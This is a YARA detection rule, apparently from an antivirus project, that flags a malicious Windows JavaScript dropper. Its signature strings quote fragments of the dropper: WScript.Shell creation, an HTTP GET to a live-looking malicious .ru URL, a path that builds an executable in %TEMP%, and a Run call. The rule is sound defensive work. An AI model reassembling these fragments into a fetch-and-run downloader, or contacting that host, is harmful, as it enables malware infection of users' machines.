rule sig_20160330_87c3f4c8cfa448e06054f9f7e1fb9ac2 {
  meta:
    description = "datamaliciousorder - file 20160330_87c3f4c8cfa448e06054f9f7e1fb9ac2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "10cc5c6302ff05c5cb9c5144cc826a854d4698d769cc6d61223c656e71b6ca21"

  strings:
    $s1  = "var T0 = function IP() {return WScript[BE](\"WScript\"+\".Shell\");}(), YT = 11;" fullword ascii
    $s2  = "function EE(I, U){UZ = UZ * 1; return I - U;};" fullword ascii
    $s3  = "OT[T](\"GET\", \"http://buketrose.ru/h3sia\", false);" fullword ascii
    $s4  = "if (OT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function W(){return JQ + \"\";};" fullword ascii
    $s6  = "function F() {return T0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UfobCB0EnOP.ex\" + \"e\";};" fullword ascii
    $s7  = "function Y() {return ((ZQ == true) && (ZQ == A)) ? 1 : UZ;};" fullword ascii
    $s8  = "function ZB(L){T0[\"Run\"](L, UZ, UZ);};" fullword ascii
    $s9  = "}while (Y0);" fullword ascii
    $s10 = "function LZ(K) {var J0 = (1, 2, 3, 4, 5, K); return J0;};" fullword ascii
    $s11 = "function Q(){return BE;};" fullword ascii
    $s12 = "function BJ()" fullword ascii
    $s13 = "function JY(){return 22;};" fullword ascii
    $s14 = "var J1 = new this[\"Date\"]();" fullword ascii
    $s15 = "return EE(G, QA);" fullword ascii
    $s16 = "A = true; " fullword ascii
    $s17 = "ZQ = true; " fullword ascii
    $s18 = "var ZQ = false;" fullword ascii
    $s19 = "var J2 = false;" fullword ascii
    $s20 = "} catch(Y2){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}